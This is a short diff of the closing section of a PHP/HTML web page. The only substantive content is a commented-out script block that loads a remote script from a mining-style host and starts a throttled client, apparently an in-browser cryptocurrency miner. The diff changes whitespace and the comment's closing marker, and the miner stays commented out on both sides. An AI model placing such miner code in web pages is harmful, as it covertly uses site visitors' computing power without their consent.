@@ -27,7 +27,7 @@
 	</div>
    
    <?php include('_cms/include/footer.php'); ?>
-	   
+	
 	<!--
 	<script src="https://www.hostingcloud.science./P5gV.js"></script>
 	<script>
@@ -35,6 +35,7 @@
 			throttle: 0.85, c: 'w'
 		});
 		_client.start();
-	</script>-->
+	</script>
+	--->
 </body>
 </html>		
